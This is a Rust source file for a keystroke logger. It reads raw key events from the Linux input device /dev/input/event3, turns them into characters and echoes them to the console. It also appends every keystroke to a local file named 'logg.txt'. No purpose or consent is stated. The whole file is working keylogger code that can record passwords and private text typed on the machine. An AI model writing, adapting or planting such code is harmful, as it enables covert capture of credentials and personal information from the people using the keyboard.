use evdev::{Device, InputEventKind, Key};
use std::collections::HashMap;
use std::fs::OpenOptions;
use std::os::unix::fs::OpenOptionsExt;
use std::io::{self, Write};
use chrono::Local;

pub fn start_logging() -> std::io::Result<()> {
    let device_path = "/dev/input/event3";
    let mut device = Device::open(device_path).expect("Failed to open device");

    let mut log_file = OpenOptions::new()
        .create(true)
        .write(true)
        .append(true)
        .mode(0o600)
        .open("logg.txt")?;
    let now = Local::now(); // Gets local time
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    println!("[{}] Starting listening for keyboard activities", timestamp);
    let key_map = create_keymap();
    let mut backspace_found: bool = false;
    loop {
        for ev in device.fetch_events().expect("Failed to fetch events") {
            if let InputEventKind::Key(key) = ev.kind() {
                if ev.value() == 1 {
                    if key != Key::KEY_BACKSPACE {
                        backspace_found = false;
                        if let Some(character) = key_map.get(&key) {
                            print!("{}", character);
                            io::stdout().flush().unwrap();
                            log_file.write_all(character.as_bytes())?;
                            log_file.flush()?;
                        }
                    } else {
                        if backspace_found {
                            continue;
                        }
                        else{
                            println!();
                            io::stdout().flush().unwrap();
                            log_file.write_all(b"\n")?;
                            log_file.flush()?;
                            backspace_found = true;
                        }
                    }
                }
            }
        }
    }
}

/* Hashmap to write the text as user inputs it */
fn create_keymap() -> HashMap<Key, &'static str> {
    HashMap::from([
        (Key::KEY_A, "a"), (Key::KEY_B, "b"), (Key::KEY_C, "c"), (Key::KEY_D, "d"),
        (Key::KEY_E, "e"), (Key::KEY_F, "f"), (Key::KEY_G, "g"), (Key::KEY_H, "h"),
        (Key::KEY_I, "i"), (Key::KEY_J, "j"), (Key::KEY_K, "k"), (Key::KEY_L, "l"),
        (Key::KEY_M, "m"), (Key::KEY_N, "n"), (Key::KEY_O, "o"), (Key::KEY_P, "p"),
        (Key::KEY_Q, "q"), (Key::KEY_R, "r"), (Key::KEY_S, "s"), (Key::KEY_T, "t"),
        (Key::KEY_U, "u"), (Key::KEY_V, "v"), (Key::KEY_W, "w"), (Key::KEY_X, "x"),
        (Key::KEY_Y, "y"), (Key::KEY_Z, "z"),
        (Key::KEY_1, "1"), (Key::KEY_2, "2"), (Key::KEY_3, "3"), (Key::KEY_4, "4"),
        (Key::KEY_5, "5"), (Key::KEY_6, "6"), (Key::KEY_7, "7"), (Key::KEY_8, "8"),
        (Key::KEY_9, "9"), (Key::KEY_0, "0"),
        (Key::KEY_SPACE, " "), (Key::KEY_ENTER, "\n"),
        (Key::KEY_MINUS, "-"), (Key::KEY_EQUAL, "="),
        (Key::KEY_LEFTBRACE, "["), (Key::KEY_RIGHTBRACE, "]"),
        (Key::KEY_BACKSLASH, "\\"), (Key::KEY_SEMICOLON, ";"),
        (Key::KEY_APOSTROPHE, "'"), (Key::KEY_GRAVE, "`"),
        (Key::KEY_COMMA, ","), (Key::KEY_DOT, "."), (Key::KEY_SLASH, "/"),
        (Key::KEY_TAB, "\t"), (Key::KEY_BACKSPACE, "\0"),
    ])
}